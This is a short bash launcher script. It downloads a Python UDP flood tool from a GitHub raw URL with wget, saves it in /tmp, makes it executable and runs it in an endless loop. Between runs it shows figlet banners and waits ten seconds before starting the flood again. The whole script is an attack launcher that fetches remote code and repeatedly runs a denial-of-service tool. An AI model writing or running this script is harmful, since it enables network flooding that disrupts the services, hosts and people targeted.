#!/bin/bash
clear
wget -O /tmp/uwu.py 'https://raw.githubusercontent.com/XaviFortes/Python-UDP-Flood/master/udpflood.py'
chmod +x /tmp/uwu.py
cd /tmp
clear
while true; do
    python3 uwu.py
    case $? in
    130) break ;;
    esac
    clear
    figlet Hit another time Ctrl + C to exit -f slant
    figlet You have 10 seconds -f smslant
    sleep 10
done
clear
